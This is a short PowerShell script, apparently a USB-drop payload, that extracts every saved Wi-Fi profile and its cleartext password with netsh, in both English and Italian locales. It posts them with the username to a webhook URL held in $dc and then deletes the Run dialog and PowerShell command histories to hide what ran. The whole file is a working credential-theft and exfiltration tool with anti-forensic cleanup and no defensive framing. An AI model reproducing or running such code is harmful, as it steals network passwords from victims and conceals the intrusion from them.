############################################################################################################################################################
[cultureinfo]::CurrentUICulture = 'en-US'
[System.Threading.Thread]::CurrentThread.CurrentUICulture = 'en-US'
$wifiProfiles_EN = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String
$wifiProfiles_IT = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenuto Chiave\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASS=$pass }} | Format-Table -AutoSize | Out-String
############################################################################################################################################################


 
$hookurl = "$dc"
$Body = @{
  'username' = $env:username 
  'content' = "Ciao! `n Ho un regalino per te :) $wifiProfiles_IT $wifiProfiles_EN `n "
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)


# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

